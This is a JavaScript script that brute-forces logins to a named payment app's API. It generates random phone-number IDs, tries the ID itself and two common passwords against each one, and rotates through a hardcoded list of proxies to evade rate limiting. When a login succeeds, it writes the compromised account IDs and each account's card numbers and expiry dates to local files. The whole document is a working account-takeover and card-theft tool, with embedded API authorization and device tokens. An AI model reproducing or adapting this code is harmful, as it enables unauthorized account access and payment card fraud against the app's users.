//const fetch = import('node-fetch');
const fs = require("fs")
var list = [    "103.167.135.112:80","34.196.10.189:9090","51.255.99.186:3128","20.111.54.16:80",    "185.20.198.250:8080",    "140.227.61.156:23456",    "20.210.26.214:3128",    "124.158.186.254:8080",    "5.104.174.199:23500",    "39.107.33.254:8090",    "94.181.48.110:1256",    "198.59.191.234:8080"];
var proxy = require("https-proxy-agent")

i = 0;
function fish(){
  i++;
var id = "011"+rand(7);
//var id = "0125113504"
var pass =id;
var pro = list[rand(1)]
Agent = new proxy.HttpsProxyAgent(pro);
var status;
var info;
fetch('https://syberapp.sybertechnology.com/api/login', {
    method: 'POST',
    headers: {
        'Host': 'syberapp.sybertechnology.com',
        'authorization': 'xwrsy67Un9oshl8H=c5g',
        'accept': 'application/json',
        'version': '100',
        'content-type': 'application/json;charset=utf-8',
      //  'content-length': '233',
        'accept-encoding': 'gzip',
        'user-agent': 'okhttp/4.9.1',
      agent:Agent
    },
    body: JSON.stringify({
        'userIdentifier': id,
        'fireBaseToken': 'diehJic_R7qwLo0wDm71k1:APA91bHsL-ye5a69TZ94Pd6e2wRW_KcXlbXWawyyFbsGudgfv4mQ-8kbJnNllyLzm9_rbdHxUJngaspTtpQQqtgr8N1M8HGzYWAjeZQrtwn2dlINzrjJLtrVO6z_jrHTYyXrs_7mxefO',
        'password': pass
    })
}).then((response)=>{
status = response.status;
return response.text()
  
}).then((data)=>{
  info = data;
  js = JSON.parse(data);
  //console.log("trying "+ id+"|"+pass+" "+status)
  if(js.errorCode == 001){
  

fetch('https://syberapp.sybertechnology.com/api/login', {
    method: 'POST',
    headers: {
        'Host': 'syberapp.sybertechnology.com',
        'authorization': 'xwrsy67Un9oshl8H=c5g',
        'accept': 'application/json',
        'version': '100',
        'content-type': 'application/json;charset=utf-8',
       // 'content-length': '233',
        'accept-encoding': 'gzip',
        'user-agent': 'okhttp/4.9.1',
        agent:Agent
    },
    body: JSON.stringify({
        'userIdentifier': id,
        'fireBaseToken': 'diehJic_R7qwLo0wDm71k1:APA91bHsL-ye5a69TZ94Pd6e2wRW_KcXlbXWawyyFbsGudgfv4mQ-8kbJnNllyLzm9_rbdHxUJngaspTtpQQqtgr8N1M8HGzYWAjeZQrtwn2dlINzrjJLtrVO6z_jrHTYyXrs_7mxefO',
        'password':'123456'
    })
}).then((response)=>{
status = response.status;
return response.text()
  
}).then((data)=>{
  info = data;
    js = JSON.parse(data);
  if(js.errorCode == 001){


fetch('https://syberapp.sybertechnology.com/api/login', {
    method: 'POST',
    headers: {
        'Host': 'syberapp.sybertechnology.com',
        'authorization': 'xwrsy67Un9oshl8H=c5g',
        'accept': 'application/json',
        'version': '100',
        'content-type': 'application/json;charset=utf-8',
      //  'content-length': '233',
        'accept-encoding': 'gzip',
        'user-agent': 'okhttp/4.9.1',
       agent:Agent
    },
    body: JSON.stringify({
        'userIdentifier': id,
        'fireBaseToken': 'diehJic_R7qwLo0wDm71k1:APA91bHsL-ye5a69TZ94Pd6e2wRW_KcXlbXWawyyFbsGudgfv4mQ-8kbJnNllyLzm9_rbdHxUJngaspTtpQQqtgr8N1M8HGzYWAjeZQrtwn2dlINzrjJLtrVO6z_jrHTYyXrs_7mxefO',
        'password': '123456789'
    })
}).then((response)=>{
status = response.status;
return response.text()
  
}).then((data)=>{
  info = data;
  js = JSON.parse(data);
  if(js.errorCode == 001){
fish()

  }else{
    var data = JSON.parse(data)
  fs.appendFile("123456789.txt",id+"\n",function (err) {if (err) throw err;console.log(id + " 123456789");});
  var cards = data.cards;
  if(cards.length > 0){
data.cards.forEach((card)=>{
    fs.appendFile("cards.txt",card.pan+"|"+card.expDate+"\n",function (err) {if (err) throw err;});})
  }
fish();
  }
    
  }).catch((err)=>{
    console.log("Blocked "+pro+" "+i);i=0;
setTimeout(()=>{
  fish()
},60000)
  console.log(info)
})



  }else{
    var data = JSON.parse(data)
  fs.appendFile("123456.txt",id+"\n",function (err) {if (err) throw err;console.log(id + " 123456");});
  var cards = data.cards;
  if(cards.length > 0){
data.cards.forEach((card)=>{
    fs.appendFile("cards.txt",card.pan+"|"+card.expDate+"\n",function (err) {if (err) throw err;});})
  }
fish();
  }
    
  }).catch((err)=>{
    console.log("Blocked "+pro+" "+i);i=0;
setTimeout(()=>{
  fish()
},60000)
  console.log(info)
})





  }else{
    var data = JSON.parse(data)
  fs.appendFile("numbers.txt",id+"\n",function (err) {if (err) throw err;console.log(id + " ID");});
  var cards = data.cards;
  if(cards.length > 0){
data.cards.forEach((card)=>{
    fs.appendFile("cards.txt",card.pan+"|"+card.expDate+"\n",function (err) {if (err) throw err;});})
  }
fish();
  }
  }).catch((err)=>{
    console.log("Blocked "+pro+" "+i);i=0;
    setTimeout(()=>{
      fish()
    },60000)
      console.log(info)
})
}
fish()

function rand(length) {
    var result           = '';
    var characters       = '0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
